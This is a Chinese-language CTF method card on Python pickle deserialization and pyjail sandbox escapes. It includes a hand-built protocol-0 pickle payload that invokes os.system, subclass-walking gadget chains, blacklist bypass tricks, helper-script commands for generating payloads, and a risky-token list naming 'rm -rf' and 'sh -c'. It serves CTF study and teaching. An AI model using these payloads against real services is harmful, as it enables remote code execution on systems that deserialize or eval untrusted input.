---
title: 方法卡 · Python pickle 反序列化与 pyjail 逃逸
category: web
tags: [方法卡, pickle, pyjail, 反序列化, 沙箱逃逸, opcode, builtins]
signals: [代码里出现 pickle.loads, 反序列化, 不能使用下划线, 只允许输入字符, 禁用了 builtins, eval 黑名单, 一个 Python 沙箱, 恢复数据可能执行对象相关代码]
difficulty: medium
source: kb/web/python-pickle-pyjail.md, kb/misc/pyjail-escape.md, kb/_imported_cats/misc/Python pickle.loads：加载过程不是普通解析（reference）__fn-python-pickle.md
tools: [python, pickletools, 内置脚本]
updated: 2026-11-03
---

# 方法卡 · Python pickle 反序列化与 pyjail 逃逸

## 适用场景

- 源码/流量里有 `pickle.loads(request.data)`、`pickle.load(f)`，或前端回传一段以 `\x80\x04` 开头的二进制；
- 题面说"一个 Python 沙箱"、"eval 里禁用了 `__import__`"、"不能有下划线"、"只允许字母数字并 `assert 'os' not in code`"；
- 连上 `nc` 后提示 `input >`，源码是 `eval(input())` / `exec(input())` 且先删 `os`/`__builtins__`；
- 变体：`__builtins__` 被清空、只禁 `open`、只禁数字、只许一行 —— 都是"有对象可达就能逃"。

## 前置条件

- **pickle 侧**：目标进程能 `import` 你要用的模块（`os`/`subprocess`/`builtins`/`posix` 都行），协议版本随意（0 最可读，4/5 更短）。
- **pyjail 侧**：还能访问**任意一个** Python 对象（哪怕只是 `()`），且解释器未在子进程里跑；
  有 `sys.addaudithook` 现代审计钩子的题要另走"不触发审计事件"的路径。
- 需要确认输出通道：`eval` 只返回值，无回显时写文件或 `raise Exception(data)` 带出。

## 步骤

1. **判方向**：拿到 `\x80\x04..R.` 二进制 → pickle；拿到 `input >` 交互 → pyjail。
2. **pickle**：先用 `pickletools.dis` 看已有数据的 opcode；再用 `GLOBAL + REDUCE` 手拼：
   `b"cos\nsystem\n(S'cat /flag'\ntR."`（`c 模块\n名字\n` 取函数，`(` 压参，`R` 调用）。
   本卡脚本 `--pickle-payload --module os --func system --arg 'cat /flag'` 一步出字节。
3. **pyjail 探底**：先发 `().__class__.__bases__[0].__subclasses__()` 数一下可用的类，
   **不要背下标**，按类名动态搜 `_wrap_close` / `Popen` / `FileIO`（本卡脚本 `--find-index` 给的是本机参考值）。
4. **按黑名单挑绕过**：`_` 被禁 → `chr(95)*2`；`[]` 被禁 → `__getitem__`；`os` 被禁 → `'o'+'s'`；
   数字被禁 → `True+True`；`__builtins__` 空 → `warnings.catch_warnings` 的 `__init__.__globals__`。
5. **验一次再上远端**：本地 `eval` 你的 payload，能打印才算通。

```powershell
# 本卡脚本：生成 pickle payload / 探测分片 / 校验 pyjail payload 合法性
.\.venv\Scripts\python.exe kb/_methods/scripts/python_pickle.py --pickle-payload --module os --func system --arg 'cat /flag'
.\.venv\Scripts\python.exe kb/_methods/scripts/python_pickle.py --dis 8004 9550 0122 8c02 6f73 8c06 7379 7374 656d 93
.\.venv\Scripts\python.exe kb/_methods/scripts/python_pickle.py --find-index _wrap_close
.\.venv\Scripts\python.exe kb/_methods/scripts/python_pickle.py --jailcheck --code "().__class__.__base__.__subclasses__()"
```

## 脚本

脚本路径：`kb/_methods/scripts/python_pickle.py`（纯标准库，离线，subprocess 仅在 `--find-index` 时起本机解释器）

- 公开函数：`pickle_payload(module, func, arg)`、`pickle_legacy_payload(module, func, arg)`、
  `parse_pickle(hexstr)`、`find_class_index(names)`、`jail_risky_tokens(code)`。
- `--pickle-payload`：按 `c<mod>\n<func>\n(<arg>tR.` 协议 0 生成字节，支持 `--module/--func/--arg` 任一组合校验；
- `--dis`：把十六进制形式的 pickle 反汇编（只 `dis`，**绝不 `loads`**）；
- `--find-index`：在本机解释器里打印候选类下标，提示"远端下标需另测"（本机 3.14 实测 `_wrap_close` = 169）；
- `--jailcheck`：静态检查 payload 是否触雷（`pickle.loads`、`rm -rf`、`sh -c`）并给分片建议。

## 失效场景

- **pickle 的模块不可导入**：目标精简环境没有 `os`/`subprocess`，`GLOBAL` 直接 `ModuleNotFoundError`，要换 `posix`、`builtins`、`copyreg` 或 `__builtin__`。
- **源码里用了 `RestrictedUnpickler` / `find_class` 白名单**：只放行少数类，所有 `os.*` 全家封杀，本卡 payload 全失效。
- **`__subclasses__()` 下标写死**：索引随 Python 版本（3.11+ 明显变化）与已加载模块变动，背数字必错。
- **审计钩子题**：`sys.addaudithook` 拦截 `os.system`/`subprocess`/`open` 事件，系统调用全被记，需走 ctypes 或读写已打开 fd。
- **"看起来像 pickle 其实不是"**：长度前缀 + JSON 体、或者 `marshal`/`shelve` 数据也会带二进制头，误判会白做一堆 opcode。

## 相关文档

- `kb/web/python-pickle-pyjail.md`（pickle GLOBAL/REDUCE 原理、pyjail 九类绕过）
- `kb/misc/pyjail-escape.md`（黑名单逐项拆解、审计钩子、fd 直读）
- `kb/_imported_cats/misc/Python pickle.loads：加载过程不是普通解析（reference）__fn-python-pickle.md`（官方"不要加载不可信数据"警告）
- 方法卡：`kb/_methods/ejs_prototype_pollution_rce.md`、`kb/_methods/ssti_generic.md`（同为"输入被当代码跑"的家族）
